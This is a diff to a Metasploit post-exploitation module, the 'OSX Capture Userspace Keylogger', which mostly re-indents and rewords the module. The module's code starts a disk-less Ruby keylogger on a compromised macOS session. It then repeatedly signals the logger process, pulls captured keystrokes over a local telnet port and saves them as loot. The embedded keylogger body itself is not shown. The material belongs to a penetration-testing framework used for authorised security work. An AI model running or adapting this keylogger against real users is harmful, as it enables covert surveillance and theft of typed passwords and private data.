@@ -8,142 +8,142 @@
 require 'shellwords'
 
 class Metasploit3 < Msf::Post
-	include Msf::Post::Common
-	include Msf::Post::File
-	include Msf::Auxiliary::Report
+  include Msf::Post::Common
+  include Msf::Post::File
+  include Msf::Auxiliary::Report
 
-	# when we need to read from the keylogger,
-	# we first "knock" the process by sending a USR1 signal.
-	# the keylogger opens a local tcp port (22899 by default) momentarily
-	# that we can connect to and read from (using cmd_exec(telnet ...)).
-	attr_accessor :port
+  # when we need to read from the keylogger,
+  # we first "knock" the process by sending a USR1 signal.
+  # the keylogger opens a local tcp port (22899 by default) momentarily
+  # that we can connect to and read from (using cmd_exec(telnet ...)).
+  attr_accessor :port
 
-	# the pid of the keylogger process
-	attr_accessor :pid
+  # the pid of the keylogger process
+  attr_accessor :pid
 
-	# where we are storing the keylog
-	attr_accessor :loot_path
-
-
-	def initialize(info={})
-		super(update_info(info,
-			'Name'          => 'OSX Capture Userspace Keylogger',
-			'Description'   => %q{
-				Logs all keyboard events except cmd-keys and GUI password input.
-
-				Keylogs are transferred between client/server in chunks
-				every SYNCWAIT seconds for reliability.
-
-				Works by calling the Carbon GetKeys() hook using the DL lib
-				in OSX's system Ruby. The Ruby code is executed in a shell
-				command using -e, so the payload never hits the disk.
-			},
-			'License'       => MSF_LICENSE,
-			'Author'        => [ 'joev <jvennix[at]rapid7.com>'],
-			'Platform'      => [ 'osx'],
-			'SessionTypes'  => [ 'shell', 'meterpreter' ]
-		))
-
-		register_options(
-			[
-				OptInt.new('DURATION', 
-					[ true, 'The duration in seconds.', 600 ]
-				),
-				OptInt.new('SYNCWAIT', 
-					[ true, 'The time between transferring log chunks.', 10 ]
-				),
-				OptPort.new('LOGPORT', 
-					[ false, 'Local port opened for momentarily for log transfer', 22899 ]
-				)
-			]
-		)
-	end
-
-	def run_ruby_code
-		# to pass args to ruby -e we use ARGF (stdin) and yaml
-		opts = {
-			:duration => datastore['DURATION'].to_i,
-			:port => self.port
-		}
-		cmd = ['ruby', '-e', ruby_code(opts)]
-
-		rpid = cmd_exec(cmd.shelljoin, nil, 10)
-
-		if rpid =~ /^\d+/
-			print_status "Ruby process executing with pid #{rpid.to_i}"
-			rpid.to_i
-		else
-			fail_with(Exploit::Failure::Unknown, "Ruby keylogger command failed with error #{rpid}")
-		end
-	end
+  # where we are storing the keylog
+  attr_accessor :loot_path
 
 
-	def run
-		if session.nil?
-			print_error "Invalid SESSION id."
-			return
-		end
+  def initialize(info={})
+    super(update_info(info,
+      'Name'          => 'OSX Capture Userspace Keylogger',
+      'Description'   => %q{
+        This module logs all keyboard events except cmd-keys and GUI password input.
 
-		if datastore['DURATION'].to_i < 1
-			print_error 'Invalid DURATION value.'
-			return
-		end
+        Keylogs are transferred between client/server in chunks
+        every SYNCWAIT seconds for reliability.
 
-		print_status "Executing ruby command to start keylogger process."
+        It works by calling the Carbon GetKeys() hook using the DL lib
+        in OSX's system Ruby. The Ruby code is executed in a shell
+        command using -e, so the payload never hits the disk.
+      },
+      'License'       => MSF_LICENSE,
+      'Author'        => [ 'joev <jvennix[at]rapid7.com>'],
+      'Platform'      => [ 'osx'],
+      'SessionTypes'  => [ 'shell', 'meterpreter' ]
+    ))
 
-		@port = datastore['LOGPORT'].to_i
-		@pid = run_ruby_code
+    register_options(
+      [
+        OptInt.new('DURATION',
+          [ true, 'The duration in seconds.', 600 ]
+        ),
+        OptInt.new('SYNCWAIT',
+          [ true, 'The time between transferring log chunks.', 10 ]
+        ),
+        OptPort.new('LOGPORT',
+          [ false, 'Local port opened for momentarily for log transfer', 22899 ]
+        )
+      ]
+    )
+  end
 
-		begin
-			Timeout.timeout(datastore['DURATION']+5) do # padding to read the last logs
-				print_status "Entering read loop"
-				while true
-					print_status "Waiting #{datastore['SYNCWAIT']} seconds."
-					Rex.sleep(datastore['SYNCWAIT'])
-					print_status "Sending USR1 signal to open TCP port..."
-					cmd_exec("kill -USR1 #{self.pid}")
-					print_status "Dumping logs..."
-					log = cmd_exec("telnet localhost #{self.port}")
-					log_a = log.scan(/^\[.+?\] \[.+?\] .*$/)
-					log = log_a.join("\n")+"\n"
-					print_status "#{log_a.size} keystrokes captured"
-					if log_a.size > 0
-						if self.loot_path.nil?
-							self.loot_path = store_loot(
-								"keylog", "text/plain", session, log, "keylog.log", "OSX keylog"
-							)
-						else
-							File.open(self.loot_path, 'a') { |f| f.write(log) }
-						end
-						print_status(log_a.map{ |a| a=~/([^\s]+)\s*$/; $1 }.join)
-						print_status "Saved to #{self.loot_path}"
-					end
-				end
-			end
-		rescue ::Timeout::Error
-			print_status "Keylogger run completed."
-		end
-	end
+  def run_ruby_code
+    # to pass args to ruby -e we use ARGF (stdin) and yaml
+    opts = {
+      :duration => datastore['DURATION'].to_i,
+      :port => self.port
+    }
+    cmd = ['ruby', '-e', ruby_code(opts)]
+
+    rpid = cmd_exec(cmd.shelljoin, nil, 10)
+
+    if rpid =~ /^\d+/
+      print_status "Ruby process executing with pid #{rpid.to_i}"
+      rpid.to_i
+    else
+      fail_with(Exploit::Failure::Unknown, "Ruby keylogger command failed with error #{rpid}")
+    end
+  end
 
 
-	def kill_process(pid)
-		print_status "Killing process #{pid.to_i}"
-		cmd_exec("kill #{pid.to_i}")
-	end
+  def run
+    if session.nil?
+      print_error "Invalid SESSION id."
+      return
+    end
 
-	def cleanup
-		return if session.nil?
-		return if not @cleaning_up.nil?
-		@cleaning_up = true
+    if datastore['DURATION'].to_i < 1
+      print_error 'Invalid DURATION value.'
+      return
+    end
 
-		if self.pid.to_i > 0
-			print_status("Cleaning up...")
-			kill_process(self.pid)
-		end
-	end
+    print_status "Executing ruby command to start keylogger process."
 
-	def ruby_code(opts={})
-		<<-EOS
+    @port = datastore['LOGPORT'].to_i
+    @pid = run_ruby_code
+
+    begin
+      Timeout.timeout(datastore['DURATION']+5) do # padding to read the last logs
+        print_status "Entering read loop"
+        while true
+          print_status "Waiting #{datastore['SYNCWAIT']} seconds."
+          Rex.sleep(datastore['SYNCWAIT'])
+          print_status "Sending USR1 signal to open TCP port..."
+          cmd_exec("kill -USR1 #{self.pid}")
+          print_status "Dumping logs..."
+          log = cmd_exec("telnet localhost #{self.port}")
+          log_a = log.scan(/^\[.+?\] \[.+?\] .*$/)
+          log = log_a.join("\n")+"\n"
+          print_status "#{log_a.size} keystrokes captured"
+          if log_a.size > 0
+            if self.loot_path.nil?
+              self.loot_path = store_loot(
+                "keylog", "text/plain", session, log, "keylog.log", "OSX keylog"
+              )
+            else
+              File.open(self.loot_path, 'ab') { |f| f.write(log) }
+            end
+            print_status(log_a.map{ |a| a=~/([^\s]+)\s*$/; $1 }.join)
+            print_status "Saved to #{self.loot_path}"
+          end
+        end
+      end
+    rescue ::Timeout::Error
+      print_status "Keylogger run completed."
+    end
+  end
+
+
+  def kill_process(pid)
+    print_status "Killing process #{pid.to_i}"
+    cmd_exec("kill #{pid.to_i}")
+  end
+
+  def cleanup
+    return if session.nil?
+    return if not @cleaning_up.nil?
+    @cleaning_up = true
+
+    if self.pid.to_i > 0
+      print_status("Cleaning up...")
+      kill_process(self.pid)
+    end
+  end
+
+  def ruby_code(opts={})
+    <<-EOS
 # Kick off a child process and let parent die
 child_pid = fork do
   require 'thread'
@@ -294,6 +294,6 @@ puts child_pid
 Process.detach(child_pid)
 
 EOS
-	end
+  end
 end
 
